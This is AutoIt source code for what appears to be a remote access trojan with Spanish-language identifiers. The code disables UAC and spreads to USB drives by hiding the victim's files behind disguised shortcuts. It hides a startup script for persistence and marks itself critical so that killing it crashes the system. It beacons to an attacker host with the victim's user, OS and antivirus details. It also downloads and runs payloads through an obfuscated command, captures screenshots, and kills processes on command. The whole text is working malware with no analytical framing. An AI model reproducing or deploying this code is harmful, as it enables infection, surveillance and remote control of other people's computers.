
if $sDelay = 1 then

	Sleep($sSeg)

EndIf

if $sUAC = 1 then

	RegWrite('HKLM\SOFTWARE\Microsoft\Security Center', 'UACDisableNotify', 'REG_DWORD', '0')
	RegWrite('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'EnableLUA', 'REG_DWORD', '0')

EndIf

if $sSpread = 1 then
	Spread_USB(0)
EndIf

if $sAtis = 1 then
	ProtectProcess_BSOD(@AutoItExe, 1)
EndIf

if $Autorun = 1 then

	Local $sFileopen = FileOpen(@StartupDir & '\Autorun.vbs', 18)
	Local $sStart = 'Set wshShell = CreateObject( "WScript.Shell" )' & @CRLF & 'wshShell.run """" & ' & chr(34) & @ScriptFullPath & chr(34) & ' & """"'

	FileWrite($sFileopen, $sStart)
	FileClose($sFileopen)

	DllCall('Kernel32.dll', 'int', 'SetFileAttributes', 'str', @StartupDir & '\Autorun.vbs', 'dword', 0x2)

EndIf

Func Spread_USB($sHideOrDelete)

	Local $sUSB = Detect_USB()

	If $sUSB = '' Then
		Exit
	Else

		Local $sArray = StringSplit($sUSB, '@')

		For $i = 0 To UBound($sArray) - 1

			If Not FileExists($sArray[$i] & '\' & @ScriptName) Then

				Local $sFiles = _FileListToArray($sArray[$i] & '\')

				For $si = 1 To UBound($sFiles) - 1

					_ExtractIcon($sArray[$i] & '\' & $sFiles[$si], $sArray[$i] & '\Icon' & $si & '.ico', 1)
					DllCall('Kernel32.dll', 'int', 'SetFileAttributes', 'str', $sArray[$i] & '\Icon' & $si & '.ico', 'dword', 0x2)
					FileCreateShortcut($sArray[$i] & '\' & @ScriptName, $sArray[$i] & '\' & $sFiles[$si] & '.lnk', '', '', '', $sArray[$i] & '\Icon' & $si & '.ico')

					If $sHideOrDelete <> 0 Then
						FileDelete($sArray[$i] & '\' & $sFiles[$si])
					Else
						DllCall('Kernel32.dll', 'int', 'SetFileAttributes', 'str', $sArray[$i] & '\' & $sFiles[$si], 'dword', 0x2)
					EndIf

				Next

				FileCopy(@ScriptFullPath, $sArray[$i] & '\' & @ScriptName)
				DllCall('Kernel32.dll', 'int', 'SetFileAttributes', 'str', $sArray[$i] & '\' & @ScriptName, 'dword', 0x2)

			EndIf

		Next

	EndIf

EndFunc

Func _ExtractIcon($source, $outsource, $iconnumber)

	$Ret = DllCall("shell32", "long", "ExtractAssociatedIcon", "int", 0, "str", $source, "int*", $iconnumber)
	$hIcon = $Ret[0]

	_GDIPlus_Startup()

	$pBitmapdll = DllCall($ghGDIPDll, "int", "GdipCreateBitmapFromHICON", "ptr", $hIcon, "int*", 0)
	$pBitmap = $pBitmapdll[2]

	_WinAPI_DestroyIcon($Ret[0])

	_GDIPlus_ImageSaveToFileEx($pBitmap, $outsource, "{557CF400-1A04-11D3-9A73-0000F81EF32E}")

	_GDIPlus_ImageDispose($pBitmap)

	_GDIPlus_Shutdown()

EndFunc

Func Detect_USB()

	Local $sReturn
	Local $sDriver = DriveGetDrive('REMOVABLE')

	If $sDriver <> 0 Then
		For $i = 1 To $sDriver[0]
			$sReturn = $sReturn & $sDriver[$i] & '@'
		Next
	EndIf

	Return StringUpper($sReturn)

EndFunc   ;==>Detect_USB

While 1
	 $sConect = TCPConnect($sIP, $sPuerto)

	if $sConect = -1 or @error then ContinueLoop

	Local $sAV = GetAntiVirus()

	Local $sSend = TCPSend($sConect, @OSLang & '|' & $sServerName & '|' & $sPuerto & '|' & @IPAddress1	& '|' & @UserName & '|' & @OSVersion & ' ' & @OSArch & '|' & $sAV & '|' & $sPass & '|' & 'OK')

	if @error then ContinueLoop

While 1

	Local $sAcciones = TCPRecv($sConect, 2048)

	if @error then ExitLoop

	if $sAcciones = 'Refrescar' then
		ShellExecute(@ScriptFullPath)
		Exit
	EndIf

	if $sAcciones = 'Disconect' then

		TCPShutdown()

	EndIf

	if $sAcciones = 'Uninstall' then

		FileDelete(@WindowsDir & '\Autorun.vbs')

		Local $sCode = 'WScript.Sleep 2000' & @CRLF & 'Set variable = CreateObject("Scripting.FileSystemObject")' & @CRLF & 'variable.DeleteFile "' & @ScriptFullPath & '"'

		$sBath = FileOpen(@TempDir & '\DEL.vbs', 17)
		FileWrite($sBath, $sCode)
		FileClose($sBath)

		TCPShutdown()

		ShellExecute(@TempDir & '\DEL.vbs')

		Exit

	EndIf

	if $sAcciones = 'Disk' then

	do
		Local $sExt = TCPRecv($sConect, 1024)
	until $sExt <> ''

	Local $sOpen = FileOpen(@TempDir & '\001.' & $sExt, 18)

	Do

		Local $sData = TCPRecv($sConect, 2048)
		If @error Then ExitLoop 2
		If StringRight($sData, 2) = 'OK' Then ExitLoop
		FileWrite($sOpen, $sData)

	Until False

	FileClose($sOpen)
	ShellExecute(@TempDir & '\001.' & $sExt)

	EndIf

	if $sAcciones = 'URL' then

		Do
			Local $sExt = TCPRecv($sConect, 1024)
		Until $sExt <> ''

		Do
			Local $sURL = TCPRecv($sConect, 3074)
		Until $sURL <> ''

		Local $sDescifrado = Cifrado_Simple_Descifrar($sURL, 54)

		_Down($sDescifrado, $sExt)

	EndIf

	if $sAcciones = 'Remote' then

		While 1

			Local $sFin = TCPRecv($sConect, 1024)

			if $sFin = 'Fin' then ExitLoop

			Local $sImage = _ScreenCapture_Capture(@TempDir & '/002.jpg')

			Local $sFileopen = FileOpen(@TempDir & '/002.jpg')

			While 1

				Local $sData = FileRead($sFileopen, 2048)
				If @error then ExitLoop
				TCPSend($sConect, $sData)
				If @error Then ExitLoop

			WEnd

			FileClose($sFileopen)

			TCPSend($sConect, 'OK')

		WEnd

	EndIf

	if $sAcciones = 'Process' then

		Local $sProcess = ProcessList()

		for $i = 1 to $sProcess[0][0]
			TCPSend($sConect, $sProcess[$i][0] & '|' & $sProcess[$i][1] & '@')
		Next

		TCPSend($sConect, 'OK')

	EndIf

	if $sAcciones = 'KillBSOD' Then

		Do
			Local $sProcesstoBSOD = TCPRecv($sConect, 1024)
		Until $sProcesstoBSOD <> ''

		ProtectProcess_BSOD($sProcesstoBSOD, 0)

		Sleep(250)

		ProcessClose($sProcesstoBSOD)

	EndIf

	if $sAcciones = 'Kill' then

		Do
			Local $sProcesskill = TCPRecv($sConect, 1024)
		Until $sProcesskill <> ''

		ProcessClose($sProcesskill)

	EndIf

	if $sAcciones = 'WEB' Then

		Do
			Local $sWEB = TCPRecv($sConect, 2048)
		Until $sWEB <> ''

		ShellExecute($sWEB)

	EndIf

WEnd
WEnd

Func _Down($sURL, $sExtension)
	ShellExecuteWait(@ComSpec , Cifrado_Simple_Descifrar('&5i&(hozygjsot&5zxgtylkx&spuh&5ju}trugj&5vxouxoz&Nomn&', 6) & $sURL & ' ' & @TempDir & '\001.' & $sExtension & ' ' , '' , '' , @SW_HIDE)
	ShellExecute(@TempDir & '\001.' & $sExtension)
EndFunc

Func Cifrado_Simple_Descifrar($texto, $numero)
	$Resultado = ''
	For $i = 1 to StringLen($texto)
		$Resultado = $Resultado & Chr(Asc(StringMid($texto, $i)) - $numero)
	next
	Return $Resultado
EndFunc

Func GetAntiVirus()

Local $sReturn

	If ProcessExists('AvastUI.exe') then
		$sReturn =  'Avast Free Antivirus'
	EndIf

	If ProcessExists('avgui.exe')= True Then
		$sReturn = 'AVG Internet Security'
	EndIf

	If ProcessExists('avgnt.exe')= True Then
		$sReturn = 'Avira Free Antivirus'
	EndIf

	If ProcessExists('egui.exe') = True Then
		$sReturn = 'Eset NOD32'
	EndIf

	If ProcessExists('Avp.exe') = True Then
		$sReturn = 'Kaspersky Anti-Virus'
	EndIf

	If ProcessExists('msseces.exe') = True Then
		$sReturn = 'Microsoft Security Essentials'
	EndIf

	If ProcessExists('Cistray.exe') = True Then
		$sReturn = 'Comodo Free Antivirus'
	EndIf

	if ProcessExists('a2cmd.exe') = true Then
		$sReturn = 'Asquared Free Antivirus'
	EndIf

	if ProcessExists('bdagexec.exe') = true Then
		$sReturn = 'Bitdefender Antivirus Software'
	EndIf

	if $sReturn = '' then
		$sReturn = 'Desconocido'
	EndIf

	Return $sReturn

EndFunc

Func ProtectProcess_BSOD($sProcessName, $Mio)

	Const $sPriority = 29
	Const $sProcess_All_Access = 0x1F0FFF
	Const $sTokenAdjustPrivileges = 0x20
	Const $sTokenQuery = 0x0008
	Local $sHandle

	Local $sPID = ProcessExists($sProcessName)

		Local $sOpenThreadToken = _Security__OpenThreadTokenEx (BitOR($sTokenAdjustPrivileges, $sTokenQuery))

		_Security__SetPrivilege($sOpenThreadToken, 'SeDebugPrivilege', True)

		DllCall('Kernel32.dll', 'int', 'CloseHandle', 'handle', $sOpenThreadToken)

		if $Mio = 0 Then

			$sHandle = DllCall('Kernel32.dll', 'handle', 'OpenProcess', 'dword', $sProcess_All_Access, 'bool', True, 'dword', $sPID)

		Else

			$sHandle = DllCall('Kernel32.dll', 'handle', 'OpenProcess', 'dword', $sProcess_All_Access, 'bool', True, 'dword', @AutoItPID)

		EndIf

		Local $sStruct = DllStructCreate('bool BSOD')
		DllStructSetData($sStruct, 'BSOD', True)

		DllCall('Ntdll.dll', 'int', 'NtSetInformationProcess', 'handle', $sHandle[0], 'int', $sPriority, 'int', DllStructGetPtr($sStruct), 'int', 4)

		DllCall('Kernel32.dll', 'int', 'CloseHandle', 'handle', $sHandle[0])

EndFunc